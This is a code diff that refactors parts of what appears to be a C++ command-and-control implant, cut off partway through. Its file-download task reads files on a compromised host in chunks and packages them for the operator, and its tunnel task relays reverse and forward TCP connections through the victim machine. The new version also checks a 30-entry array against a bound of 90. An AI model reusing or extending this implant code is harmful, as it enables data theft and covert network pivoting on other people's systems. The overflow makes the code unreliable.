@@ -165,7 +165,7 @@ auto DECLFN Task::ProcessDownloads(
     }
 
     FILE_DOWNLOAD_EVENT Events[30] = { 0 };
-    ULONG StartTcpLength = 0;
+    ULONG StartEvtLen = 0;
 
 	for (INT i = 0; i < 30; i++) {
         if ( Self->Tsp->Down[i].FileID && Str::LengthA( Self->Tsp->Down[i].FileID ) ) {
@@ -197,11 +197,11 @@ auto DECLFN Task::ProcessDownloads(
                 Self->Ntdll.NtClose( Self->Tsp->Down[i].FileHandle );
                 hFree(FileBuffer);
 
-                Events[StartTcpLength].FileID = Self->Tsp->Down[i].FileID;
-                Events[StartTcpLength].ErrorCode = 1;
+                Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
+                Events[StartEvtLen].ErrorCode = 1;
                 CHAR* Reason = "CHUNK_READ_ERROR";
-                Events[StartTcpLength].Reason = Reason;
-                StartTcpLength++;
+                Events[StartEvtLen].Reason = Reason;
+                StartEvtLen++;
 
                 if ( Self->Tsp->Down[i].Path ) hFree( Self->Tsp->Down[i].Path );
                 Self->Tsp->Down[i].FileID = nullptr;
@@ -211,13 +211,13 @@ auto DECLFN Task::ProcessDownloads(
                 continue;
             }
 
-            Events[StartTcpLength].FileID = Self->Tsp->Down[i].FileID;
-            Events[StartTcpLength].ErrorCode = 0;
-            Events[StartTcpLength].Data = FileBuffer;
-            Events[StartTcpLength].DataLen = BytesRead;
-            Events[StartTcpLength].CurChunk = Self->Tsp->Down[i].CurChunk;
-            Events[StartTcpLength].TotalChunks = Self->Tsp->Down[i].TotalChunks;
-            StartTcpLength++;
+            Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
+            Events[StartEvtLen].ErrorCode = 0;
+            Events[StartEvtLen].Data = FileBuffer;
+            Events[StartEvtLen].DataLen = BytesRead;
+            Events[StartEvtLen].CurChunk = Self->Tsp->Down[i].CurChunk;
+            Events[StartEvtLen].TotalChunks = Self->Tsp->Down[i].TotalChunks;
+            StartEvtLen++;
 
             BOOL IsFinalChunk = (Self->Tsp->Down[i].CurChunk == Self->Tsp->Down[i].TotalChunks);
             
@@ -229,18 +229,18 @@ auto DECLFN Task::ProcessDownloads(
                 if ( Self->Tsp->Down[i].Path ) hFree( Self->Tsp->Down[i].Path );
                 Self->Tsp->Down[i].FileID = nullptr;
                 Self->Tsp->Down[i].Path = nullptr;
-                Self->Tsp->numDownloadTasks--;
+                Self->Tsp->DownloadTasksCount--;
             }
         }
     }
 
-    Self->Pkg->Int32( Package, StartTcpLength );
-    if( StartTcpLength == 0 ){
+    Self->Pkg->Int32( Package, StartEvtLen );
+    if( StartEvtLen == 0 ){
         Job->Clean = TRUE;
         return KhRetSuccess;
     }
 
-    for (INT i = 0; i < StartTcpLength; i++) {
+    for (INT i = 0; i < StartEvtLen; i++) {
         if (Events[i].FileID && Str::LengthA(Events[i].FileID)) {
             Self->Pkg->Str(Job->Pkg, Events[i].FileID);
             Self->Pkg->Int32(Job->Pkg, Events[i].ErrorCode);
@@ -265,7 +265,7 @@ auto DECLFN Task::ProcessDownloads(
         }
     }
 
-    for (INT i = 0; i < StartTcpLength; i++) {
+    for (INT i = 0; i < StartEvtLen; i++) {
         if ( Events[i].Data && Events[i].ErrorCode == 0 ) {
             hFree( Events[i].Data );
         }
@@ -293,15 +293,11 @@ auto DECLFN Task::Download(
 
     FileID = Self->Psr->Str( Parser, 0 );
     if ( ! FileID || ! Str::LengthA( FileID ) ) {
-        CHAR* ErrorMsg = "Invalid file ID";
-        KhDbg("%s", ErrorMsg);
-        
         Self->Pkg->Str( Package, FileID );
         Self->Pkg->Int32( Package, 1 ); // Error
-        CHAR* Reason = "INVALID_FILE_ID";
-        Self->Pkg->Str( Package, Reason ); // Reason
+        Self->Pkg->Str( Package, "INVALID_FILE_ID" ); // Reason
 
-        QuickErr( ErrorMsg );
+        QuickErr( "Invalid file ID" );
         return KhRetSuccess;
     }
 
@@ -309,15 +305,12 @@ auto DECLFN Task::Download(
     KhDbg("Download file Path: %s", FilePath);
 
     if ( ! FilePath || ! Str::LengthA( FilePath ) ) {
-        CHAR* ErrorMsg = "Invalid file path";
-        KhDbg("%s", ErrorMsg);
 
         Self->Pkg->Str( Package, FileID );
         Self->Pkg->Int32( Package, 1 ); // Error
-        CHAR* Reason = "INVALID_FILE_PATH";
-        Self->Pkg->Str( Package, Reason ); // Reason
+        Self->Pkg->Str( Package, "INVALID_FILE_PATH" ); // Reason
 
-        QuickErr( ErrorMsg );
+        QuickErr( "Invalid file path" );
         return KhRetSuccess;
     }
 
@@ -326,15 +319,11 @@ auto DECLFN Task::Download(
     HANDLE FileHandle = Self->Krnl32.CreateFileA( FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 
     if ( FileHandle == INVALID_HANDLE_VALUE ) {
-        CHAR* ErrorMsg = "Failed to open file for reading";
-        KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
-
         Self->Pkg->Str( Package, FileID );
         Self->Pkg->Int32( Package, 1 ); // Error
-        CHAR* Reason = "INVALID_FILE_HANDLE";
-        Self->Pkg->Str( Package, Reason ); // Reason
+        Self->Pkg->Str( Package, "INVALID_FILE_HANDLE" ); // Reason
 
-        QuickErr( ErrorMsg );
+        QuickErr( "Failed to open file for reading" );
         return KhRetSuccess;
     }
 
@@ -349,48 +338,46 @@ auto DECLFN Task::Download(
 
     KhDbg("index: %d", Index);
 
-    if (Index == -1) {
-        CHAR* ErrorMsg = "Maximum concurrent uploads (30) reached";
-        KhDbg("%s", ErrorMsg);
-
+    if ( Index == -1 ) {
         Self->Pkg->Str( Package, FileID );
         Self->Pkg->Int32( Package, 1 ); // Error
-        CHAR* Reason = "MAX_DOWNLOADS_REACHED";
-        Self->Pkg->Str( Package, Reason ); // Reason
+        Self->Pkg->Str( Package, "MAX_DOWNLOADS_REACHED" ); // Reason
 
-        QuickErr( ErrorMsg );
+        QuickErr( "Maximum concurrent uploads (30) reached" );
         Self->Ntdll.NtClose( FileHandle );
         return KhRetSuccess;
     }
-
     
     FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );
 
-    ULONG FileIDLen = Str::LengthA( FileID );
+    ULONG FileIDLen  = Str::LengthA( FileID );
     CHAR* FileIDCopy = (CHAR*)hAlloc( FileIDLen + 1 );
+
     Str::CopyA( FileIDCopy, FileID );
 
-    ULONG FilePathLen = Str::LengthA( FilePath );
+    ULONG FilePathLen  = Str::LengthA( FilePath );
     CHAR* FilePathCopy = (CHAR*)hAlloc( FilePathLen + 1 );
+
     Str::CopyA( FilePathCopy, FilePath );
 
-    Self->Tsp->Down[Index].FileID = FileIDCopy;
-    Self->Tsp->Down[Index].ChunkSize = chunksize; 
-    Self->Tsp->Down[Index].CurChunk = 1;
+    Self->Tsp->Down[Index].FileID      = FileIDCopy;
+    Self->Tsp->Down[Index].ChunkSize   = chunksize; 
+    Self->Tsp->Down[Index].CurChunk    = 1;
     Self->Tsp->Down[Index].TotalChunks = (FileSize + chunksize - 1) / chunksize;
-    Self->Tsp->Down[Index].Path   = FilePathCopy;
-    Self->Tsp->Down[Index].FileHandle = FileHandle;
+    Self->Tsp->Down[Index].Path        = FilePathCopy;
+    Self->Tsp->Down[Index].FileHandle  = FileHandle;
 
-    Self->Tsp->numDownloadTasks++;
-    if(Self->Tsp->numDownloadTasks == 1){
+    Self->Tsp->DownloadTasksCount++;
+
+    if ( Self->Tsp->DownloadTasksCount == 1 ) {
         KhDbg("Adding Process Downloads job");
         PARSER* TmpPsrDownload = nullptr;
-        BYTE*   tmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
-        UINT16  cmdDownload    = (UINT16)Enm::Task::ProcessDownloads;
+        BYTE*   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
+        UINT16  CmdDownload    = (UINT16)Enm::Task::ProcessDownloads;
         JOBS*   NewJobDownload = nullptr;
         // 4-byte big-endian length
-        tmpBufDownload[0] = (cmdDownload     ) & 0xFF;
-        tmpBufDownload[1] = (cmdDownload >> 8) & 0xFF;
+        TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
+        TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
         TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
         if ( ! TmpPsrDownload ) {         
@@ -398,14 +385,14 @@ auto DECLFN Task::Download(
             return KhGetError;
         }
     
-        Self->Psr->New( TmpPsrDownload, tmpBufDownload, sizeof(UINT16) );
-        hFree(tmpBufDownload);
+        Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
+
+        hFree( TmpBufDownload );
     
         NewJobDownload = Self->Jbs->Create( Self->Jbs->DownloadUUID, TmpPsrDownload, TRUE );
         if ( ! NewJobDownload ) {
             KhDbg("WARNING: Failed to create job for Process Download task");
             return KhGetError;
-            hFree(tmpBufDownload);
         }
     }
 
@@ -1845,17 +1832,15 @@ auto DECLFN Task::Token(
 auto DECLFN Task::ProcessTunnel(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-
-    KhDbg("[Task::ProcessTunnel]");
-
     PACKAGE* Package = Job->Pkg;
 
-    COMMAND_TUNNEL_ACCEPT_EVENT Events_Accept[30] = { 0 };
-    ULONG COMMAND_TUNNEL_ACCEPT_EventLen = 0;
-    COMMAND_TUNNEL_START_TCP_EVENT Events[90] = { 0 };
-    ULONG StartTcpLength = 0;
-    COMMAND_TUNNEL_WRITE_TCP_EVENT Events_Write[30] = { 0 };
-    ULONG COMMAND_TUNNEL_WRITE_TCP_EventLen = 0;
+    COMMAND_TUNNEL_ACCEPT_EVENT    AcceptEvents[30] = { 0 };
+    COMMAND_TUNNEL_START_TCP_EVENT Events[90]       = { 0 };
+    COMMAND_TUNNEL_WRITE_TCP_EVENT WriteEvents[30]  = { 0 };
+
+    ULONG WriteEvtLen = 0;
+    ULONG AcceptLen = 0;
+    ULONG StartEvtLen = 0;
 
     INT8  Index    = -1;
     for ( INT i = 0; i < 30; i++ ) {
@@ -1864,29 +1849,36 @@ auto DECLFN Task::ProcessTunnel(
         }
     }
 
-	timeval timeout = { 0, 100 };
-	for (INT i = 0; i < 30; i++) {
+	timeval Timeout = { 0, 100 };
 
-        if (Self->Tsp->Tunnels[i].state == TUNNEL_STATE_CONNECT) {
+	for ( INT i = 0; i < 30; i++ ) {
+        if ( Self->Tsp->Tunnels[i].State == TUNNEL_STATE_CONNECT ) {
+            ULONG  ChannelId = Self->Tsp->Tunnels[i].ChannelID;
+            fd_set Readfds;
 
-            ULONG channelId = Self->Tsp->Tunnels[i].ChannelID;
-            fd_set readfds;
-            readfds.fd_count = 1;
-            readfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
-            fd_set exceptfds;
-            exceptfds.fd_count = 1;
-            exceptfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
-            fd_set writefds;
-            writefds.fd_count = 1;
-            writefds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
-            Self->Ws2_32.select(0, &readfds, &writefds, &exceptfds, &timeout);
+            Readfds.fd_count = 1;
+            Readfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
 
-            if ( Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP ) {
-                if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &readfds)) {
-                    SOCKET sock = Self->Ws2_32.accept(Self->Tsp->Tunnels[i].Socket, 0, 0);
-                    ULONG mode = 1;
-                    if (Self->Ws2_32.ioctlsocket(sock, FIONBIO, &mode) == -1) {
-                        Self->Ws2_32.closesocket(sock);
+            fd_set Exceptfds;
+
+            Exceptfds.fd_count = 1;
+            Exceptfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
+
+            fd_set Writefds;
+
+            Writefds.fd_count    = 1;
+            Writefds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
+
+            Self->Ws2_32.select( 0, &Readfds, &Writefds, &Exceptfds, &Timeout );
+
+            if ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_REVERSE_TCP ) {
+                if ( Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &Readfds ) ) {
+
+                    SOCKET SocketObj = Self->Ws2_32.accept( Self->Tsp->Tunnels[i].Socket, 0, 0 );
+                    ULONG  Mode      = 1;
+
+                    if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) == -1 ) {
+                        Self->Ws2_32.closesocket( SocketObj );
                         continue;
                     }
     
@@ -1896,279 +1888,232 @@ auto DECLFN Task::ProcessTunnel(
     
                     KhDbg("cid: %lu", cid);
                     
-                    if(Index != -1){
+                    if ( Index != -1 ) {
                         Self->Tsp->Tunnels[Index].ChannelID = cid;
-                        Self->Tsp->Tunnels[Index].Port = 0;
-                        Self->Tsp->Tunnels[Index].Host = "";
-                        Self->Tsp->Tunnels[Index].Username = "";
-                        Self->Tsp->Tunnels[Index].Password = ""; 
-                        Self->Tsp->Tunnels[Index].Socket = sock;  
-                        Self->Tsp->Tunnels[Index].state = TUNNEL_STATE_READY;
-                        Self->Tsp->Tunnels[Index].mode = TUNNEL_MODE_SEND_TCP;                     
-                        Self->Tsp->Tunnels[Index].waitTime = 180000;                     
-                        Self->Tsp->Tunnels[Index].startTick = Self->Krnl32.GetTickCount();
-                        Self->Tsp->numTunnelTasks++;
+                        Self->Tsp->Tunnels[Index].Port      = 0;
+                        Self->Tsp->Tunnels[Index].Host      = "";
+                        Self->Tsp->Tunnels[Index].Username  = "";
+                        Self->Tsp->Tunnels[Index].Password  = ""; 
+                        Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
+                        Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_READY;
+                        Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_SEND_TCP;                     
+                        Self->Tsp->Tunnels[Index].WaitTime  = 180000;                     
+                        Self->Tsp->Tunnels[Index].StartTick = Self->Krnl32.GetTickCount();
+                        Self->Tsp->TunnelTasksCount++;
                     }
                     
-                    if (COMMAND_TUNNEL_ACCEPT_EventLen < 30) {
-                        Events_Accept[COMMAND_TUNNEL_ACCEPT_EventLen].TunnelID = Self->Tsp->Tunnels[i].ChannelID;
-                        Events_Accept[COMMAND_TUNNEL_ACCEPT_EventLen].SubCmd = COMMAND_TUNNEL_ACCEPT;
-                        Events_Accept[COMMAND_TUNNEL_ACCEPT_EventLen].ChannelID = cid;
-                        COMMAND_TUNNEL_ACCEPT_EventLen++;
+                    if ( AcceptLen < 30 ) {
+                        AcceptEvents[AcceptLen].TunnelID  = Self->Tsp->Tunnels[i].ChannelID;
+                        AcceptEvents[AcceptLen].SubCmd    = COMMAND_TUNNEL_ACCEPT;
+                        AcceptEvents[AcceptLen].ChannelID = cid;
+                        AcceptLen++;
                     }
-                    // packer->Pack32(Self->Tsp->Tunnels[i].ChannelID); // tunnel ID
-                    // packer->Pack32(COMMAND_TUNNEL_ACCEPT);
-                    // packer->Pack32(cid);
                 }
-            }else{
-                if (Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_SEND_TCP) {
-                    KhDbg("BP 3 -1");
-                    if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &exceptfds)) {
-                        Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
-                        // Pack and send to server
-                        //PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
-                        ULONG result = 0;
+            } else {
+                if ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_SEND_TCP ) {
+                    if ( Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &Exceptfds ) ) {
+                        Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
+
+                        ULONG Result = 0;
     
-                        if (StartTcpLength < 90) {
-                            Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                            Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                            Events[StartTcpLength].Result = result;
-                            StartTcpLength++;
+                        if ( StartEvtLen < 90 ) {
+                            Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                            Events[StartEvtLen].SubCmd = COMMAND_TUNNEL_START_TCP;
+                            Events[StartEvtLen].Result = Result;
+                            StartEvtLen++;
                         }
     
-                        // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
-                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
-                        // Self->Pkg->Int32( Package, result );
                         continue;
                     }
-                    KhDbg("BP 3 -2");
-                    if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &writefds)) {
-                        Self->Tsp->Tunnels[i].state = TUNNEL_STATE_READY;
-                        // Pack and send to server
-                        // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
-                        ULONG result = 1;
+
+                    if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[i].Socket, &Writefds ) ) {
+                        Self->Tsp->Tunnels[i].State = TUNNEL_STATE_READY;
+                        ULONG Result = 1;
     
-                        if (StartTcpLength < 90) {
-                            Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                            Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                            Events[StartTcpLength].Result = result;
-                            StartTcpLength++;
+                        if ( StartEvtLen < 90 ) {
+                            Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                            Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
+                            Events[StartEvtLen].Result    = Result;
+                            StartEvtLen++;
                         }
-    
-                        // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
-                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
-                        // Self->Pkg->Int32( Package, result );
                         continue;
                     }
-                    KhDbg("BP 3 -3");
-                    if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &readfds)) {
-                        SOCKET tmp_sock_2 = Self->Ws2_32.accept(Self->Tsp->Tunnels[i].Socket, 0, 0);
-                        Self->Tsp->Tunnels[i].Socket = tmp_sock_2;
-                        KhDbg("BP - 3 -4");
-                        if (tmp_sock_2 == -1) {
-                            Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
-                            // Pack and send to server
-                            // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
-                            ULONG result = 0;
-                            if (StartTcpLength < 90) {
-                                Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                                Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                                Events[StartTcpLength].Result = result;
-                                StartTcpLength++;
+                    if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[i].Socket, &Readfds ) ) {
+                        
+                        SOCKET TmpSocketObj = Self->Ws2_32.accept( Self->Tsp->Tunnels[i].Socket, 0, 0 );
+                        Self->Tsp->Tunnels[i].Socket = TmpSocketObj;
+                        if ( TmpSocketObj == -1 ) {
+                            Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
+                            
+                            ULONG Result = 0;
+
+                            if ( StartEvtLen < 90 ) {
+                                Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                                Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
+                                Events[StartEvtLen].Result    = Result;
+                                StartEvtLen++;
                             }
-                            // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
-                            // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
-                            // Self->Pkg->Int32( Package, result );
                         }
                         else {
-                            Self->Tsp->Tunnels[i].state = TUNNEL_STATE_READY;
-                            // Pack and send to server
-                            // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
-                            ULONG result = 1;
+                            Self->Tsp->Tunnels[i].State = TUNNEL_STATE_READY;
+
+                            ULONG Result = 1;
     
-                            if (StartTcpLength < 90) {
-                                Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                                Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                                Events[StartTcpLength].Result = result;
-                                StartTcpLength++;
+                            if ( StartEvtLen < 90 ) {
+                                Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                                Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
+                                Events[StartEvtLen].Result    = Result;
+                                StartEvtLen++;
                             }
     
-                            // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
-                            // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
-                            // Self->Pkg->Int32( Package, result );
                         }
+
                         Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket);
                         continue;
                     }
                 }
                 
-                if (Self->Krnl32.GetTickCount() - Self->Tsp->Tunnels[i].startTick > Self->Tsp->Tunnels[i].waitTime) {
+                if ( Self->Krnl32.GetTickCount() - Self->Tsp->Tunnels[i].StartTick > Self->Tsp->Tunnels[i].WaitTime ) {
     
-                    Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
-                    // Pack and send to server
-                    // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
-                    ULONG result = 0;
+                    Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
+
+                    ULONG Result = 0;
     
-                    if (StartTcpLength < 90) {
-                        Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                        Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                        Events[StartTcpLength].Result = result;
-                        StartTcpLength++;
+                    if (StartEvtLen < 90) {
+                        Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                        Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
+                        Events[StartEvtLen].Result    = Result;
+                        StartEvtLen++;
                     }
-                    // Self->Pkg->Int64( Package, Self->Tsp->Tunnels[i].ChannelID );
-                    // Self->Pkg->Int64( Package, COMMAND_TUNNEL_START_TCP );
-                    // Self->Pkg->Int16( Package, result );
                 }
             }
         }
     }
-	
-    // --- END OF CHECK PROXY
 
 	ULONG finishTick = Self->Krnl32.GetTickCount() + 2500;
-	// while ( this->RecvProxy(packer) && ApiWin->GetTickCount() < finishTick );
 
-        // collect and pack actual proxy data until timeout (adapted RecvProxy logic)
     while ( Self->Krnl32.GetTickCount() < finishTick ) {
         ULONG iterCount = 0;
         KhDbg("In Recv");
         for ( INT i = 0; i < 30; i++ ) {
-            if ( Self->Tsp->Tunnels[i].state != TUNNEL_STATE_READY ) continue;
+            if ( Self->Tsp->Tunnels[i].State != TUNNEL_STATE_READY ) continue;
 
-            ULONG dataLength = 0;
-            int rc = Self->Ws2_32.ioctlsocket( Self->Tsp->Tunnels[i].Socket, FIONREAD, &dataLength );
-            if ( dataLength > 0xFFFFC ) dataLength = 0xFFFFC;
+            ULONG DataLength = 0;
+            int rc = Self->Ws2_32.ioctlsocket( Self->Tsp->Tunnels[i].Socket, FIONREAD, &DataLength );
+            if ( DataLength > 0xFFFFC ) DataLength = 0xFFFFC;
 
             if ( rc == -1 ) {
-                KhDbg("rc = -1, Closing Tunnel %d, Adding to COMMAND_TUNNEL_START_TCP", Self->Tsp->Tunnels[i].ChannelID);
-                Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
-                ULONG result = 0;
+                Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
 
-                if (StartTcpLength < 90) {
-                    Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                    Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                    Events[StartTcpLength].Result = result;
-                    StartTcpLength++;
+                ULONG Result = 0;
+
+                if ( StartEvtLen < 90 ) {
+                    Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                    Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
+                    Events[StartEvtLen].Result    = Result;
+                    StartEvtLen++;
                 }
-                // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
-                // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
-                // Self->Pkg->Int32( Package, 0 );
             } else {
-                KhDbg("rc != -1, dataLength=%lu on Tunnel %d", dataLength, Self->Tsp->Tunnels[i].ChannelID);
-                if ( dataLength ) {
-                    BYTE* buffer = (BYTE*)hAlloc( dataLength );
-                    if (!buffer) continue;
+                KhDbg("rc != -1, DataLength=%lu on Tunnel %d", DataLength, Self->Tsp->Tunnels[i].ChannelID);
+                if ( DataLength ) {
                     
-                    BYTE* bufferBase = buffer; // Keep original pointer for freeing and accessing data
+                    PBYTE Buffer = (PBYTE)hAlloc( DataLength );
+                    if ( ! Buffer ) continue;
                     
-                    // ULONG readed = ReadFromSocket( Self->Tsp->Tunnels[i].Socket, (PCHAR)buffer, dataLength );
-                    DWORD recvSize;
-                    ULONG dwReaded = 0;
-                    BOOL continuer = true;
-                    BOOL continuer2 = true;
-                    ULONG readed = -1;
+                    BYTE* BufferBase = Buffer; // Keep original pointer for freeing and accessing data
+                    
+                    DWORD RecvSize   = 0;
+                    ULONG dwReaded   = 0;
+                    BOOL  Continuer  = true;
+                    BOOL  Continuer2 = true;
+                    ULONG readed     = -1;
 
-                    if (dataLength <= 0){
-                        continuer = false;
-                        readed = 0;
+                    if ( DataLength <= 0 ) {
+                        Continuer = FALSE; readed = 0;
                     }
 
-                    if (continuer){
+                    if ( Continuer ) {
                         KhDbg("Starting recv loop for Tunnel %d", Self->Tsp->Tunnels[i].ChannelID);
-                        while (1) {
-                            recvSize = Self->Ws2_32.recv(Self->Tsp->Tunnels[i].Socket, (PCHAR)(buffer + dwReaded), dataLength - dwReaded, 0);
-                            if (recvSize == 0 || recvSize == -1)
-                                break;
+                        while ( 1 ) {
+                            RecvSize = Self->Ws2_32.recv(Self->Tsp->Tunnels[i].Socket, (PCHAR)( Buffer + dwReaded ), DataLength - dwReaded, 0);
+                            if ( RecvSize == 0 || RecvSize == -1 ) break;
     
-                            dwReaded += recvSize;
+                            dwReaded += RecvSize;
     
-                            if ((int)dwReaded >= dataLength){
-                                continuer2 = false;
-                                readed = dwReaded;
+                            if ( (int)dwReaded >= DataLength ) {
+                                Continuer2 = FALSE; readed = dwReaded;
                                 break;
                             }
                         }
-                        if(continuer2){
-                            Self->Ws2_32.shutdown(Self->Tsp->Tunnels[i].Socket, 2);
-                            Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket);
+
+                        if( Continuer2 ){
+                            Self->Ws2_32.shutdown( Self->Tsp->Tunnels[i].Socket, 2 );
+                            Self->Ws2_32.closesocket( Self->Tsp->Tunnels[i].Socket );
                             readed = -1;
                         }
                     }
+
                     KhDbg("Finished recv loop for Tunnel %d, readed=%lu", Self->Tsp->Tunnels[i].ChannelID, readed);
 
                     if ( readed == (ULONG)-1 ) {
-                        KhDbg("readed == -1, Closing Tunnel %d, Adding to COMMAND_TUNNEL_START_TCP", Self->Tsp->Tunnels[i].ChannelID);
-                        Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
-                        ULONG result = 0;
+                        Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
 
-                        if (StartTcpLength < 90) {
-                            Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
-                            Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
-                            Events[StartTcpLength].Result = result;
-                            StartTcpLength++;
+                        ULONG Result = 0;
+
+                        if ( StartEvtLen < 90 ) {
+                            Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                            Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
+                            Events[StartEvtLen].Result    = Result;
+                            StartEvtLen++;
                         }
-                        // Self->Pkg->Int32( Package, t.ChannelID );
-                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
-                        // Self->Pkg->Int32( Package, 0 );
-                        hFree( bufferBase );
+
+                        hFree( BufferBase );
                     } else if ( readed ) {
                         KhDbg("readed %lu bytes from Tunnel %d, Adding to COMMAND_TUNNEL_WRITE_TCP", readed, Self->Tsp->Tunnels[i].ChannelID);
 
-                        KhDbg( "READED BYTES" );
-                        for ( UINT64 i = 0; i < readed; i++ ) {
-                            KhDbg( "%02X ", bufferBase[i] );
+                        //// debug chunk data
+                        // KhDbg( "READED BYTES" );
+                        // for ( UINT64 i = 0; i < readed; i++ ) {
+                        //     KhDbg( "%02X ", BufferBase[i] );
+                        // }
+                        // KhDbg( "Done Printing\n" );
+
+                        if ( WriteEvtLen < 90 ) {
+                            WriteEvents[WriteEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
+                            WriteEvents[WriteEvtLen].SubCmd    = COMMAND_TUNNEL_WRITE_TCP;
+                            WriteEvents[WriteEvtLen].Data      = BufferBase;
+                            WriteEvents[WriteEvtLen].DataLen   = readed;
+                            WriteEvtLen++;
                         }
-                        KhDbg( "Done Printing\n" );
 
-
-                        if (COMMAND_TUNNEL_WRITE_TCP_EventLen < 90) {
-                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
